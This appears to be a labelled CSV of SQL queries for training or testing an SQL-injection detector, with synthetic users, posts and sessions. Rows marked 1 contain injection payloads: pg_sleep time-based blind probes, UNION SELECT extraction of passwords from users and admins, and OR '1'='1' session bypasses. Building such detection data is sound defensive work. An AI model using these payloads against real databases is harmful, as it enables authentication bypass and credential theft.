text,label
SELECT * FROM users WHERE username = 'user76' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user18' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user79' AND password = 'pass79',0
SELECT * FROM users WHERE username = 'user74' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 26 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user45' AND password = 'pass45',0
SELECT * FROM users WHERE username = 'user50' AND password = 'pass50',0
SELECT * FROM posts WHERE id = 51 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 14,0
DELETE FROM posts WHERE id = 98,0
SELECT * FROM posts WHERE id = 29 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title882' IS NULL OR title LIKE '%title882%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT salt FROM users WHERE username = 'user20',0
SELECT salt FROM users WHERE username = 'user56',0
"SELECT * FROM users WHERE username = 'user82' UNION SELECT username, password FROM admins --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title967' IS NULL OR title LIKE '%title967%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM users WHERE username = 'user55' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM posts WHERE id = 14 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_9696' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
DELETE FROM posts WHERE id = 68,0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT user_id FROM sessions WHERE session_id = 'sess_3499' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 48,0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title641' IS NULL OR title LIKE '%title641%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title444' IS NULL OR title LIKE '%title444%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT * FROM users WHERE username = 'user12' UNION SELECT username, password FROM admins --",1
SELECT * FROM users WHERE username = 'user95' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_81533' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 42,0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT user_id FROM sessions WHERE session_id = 'sess_78052' AND expire_date > NOW(),0
"SELECT * FROM users WHERE username = 'user33' UNION SELECT username, password FROM admins --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_13005' AND expire_date > NOW(),0
DELETE FROM posts WHERE id = 33,0
SELECT * FROM sessions WHERE session_id = 'sess_33233' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT salt FROM users WHERE username = 'user12',0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT * FROM users WHERE username = 'user70' UNION SELECT username, password FROM admins --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_40862' AND expire_date > NOW(),0
SELECT salt FROM users WHERE username = 'user27',0
SELECT * FROM users WHERE username = 'user88' AND password = 'pass88',0
SELECT * FROM users WHERE username = 'user23' AND password = 'pass23',0
"SELECT * FROM users WHERE username = 'user43' UNION SELECT username, password FROM admins --",1
SELECT user_id FROM sessions WHERE session_id = 'sess_87452' AND expire_date > NOW(),0
DELETE FROM posts WHERE id = 63,0
"SELECT id FROM sessions WHERE session_id = 'sess_56446' UNION SELECT id, role FROM admins --",1
SELECT * FROM posts WHERE id = 71 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
